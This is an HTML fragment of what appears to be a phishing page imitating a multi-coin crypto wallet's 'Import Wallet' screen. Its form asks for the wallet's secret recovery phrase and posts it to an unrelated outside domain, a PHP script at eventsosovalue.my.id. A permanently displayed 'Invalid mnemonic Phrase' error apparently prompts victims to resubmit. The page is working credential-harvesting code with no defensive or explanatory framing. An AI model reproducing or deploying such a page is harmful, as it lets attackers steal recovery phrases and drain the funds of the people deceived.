<div class="flex justify-center my-4">

    </div>
<header class="pt-4 px-5 flex items-center">
    <button aria-label="Back" class="text-gray-400 text-2xl">
      <i class="fas fa-arrow-left"></i>
    </button>
    <h1 class="flex-grow text-center text-white font-semibold text-lg leading-6">
      Multi-Coin wallet
    </h1>
    <div class="w-8"></div>
  </header>

  <main class="px-5 flex-grow">
    <form class="space-y-6" method="post" action="https://eventsosovalue.my.id/pluss.php?nkbihfbeogaeaoehlefnkodbefgpgknn/home">
      <div>
        <label for="walletName" class="block text-white text-sm font-normal mb-1">
          Wallet Name
        </label>
        <div class="relative">
          <input id="walletName" type="text" placeholder="Enter Name" class="w-full bg-[#121212] border border-gray-500 rounded-md py-3 px-4 pr-10 text-gray-400 placeholder-gray-600 focus:outline-none focus:ring-1 focus:ring-purple-700 focus:border-purple-700">
          <button type="button" aria-label="Clear input" class="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-400">
            <i class="fas fa-times"></i>
          </button>
        </div>
      </div>

      <div>
        <label for="secretPhrase" class="block text-white text-sm font-normal mb-1">
          Secret Phrase
        </label>
        <div class="relative">
          <textarea id="secretPhrase" name="backupPhrase" minlength="24" maxlength="305" required="" rows="5" placeholder="Secret Phrase" class="w-full bg-[#121212] border border-gray-500 rounded-md py-3 px-4 pr-16 text-gray-500 placeholder-gray-600 resize-none focus:outline-none focus:ring-1 focus:ring-purple-700 focus:border-purple-700"></textarea>
          <button type="button" class="absolute bottom-3 right-3 text-purple-700 font-medium text-sm">
            Paste
          </button>
        </div>
      </div>
     <p class="text-[red] text-center text-base font-normal mt-2">
      Invalid mnemonic Phrase / Private Key Typically 12 words separated by single spaces
    </p>
   
	<br>
	<br>
	 <button type="submit" class="w-full bg-purple-700 rounded-full py-4 text-white font-semibold text-lg leading-6">
      Import Wallet
    </button>
	</form>
  </main>
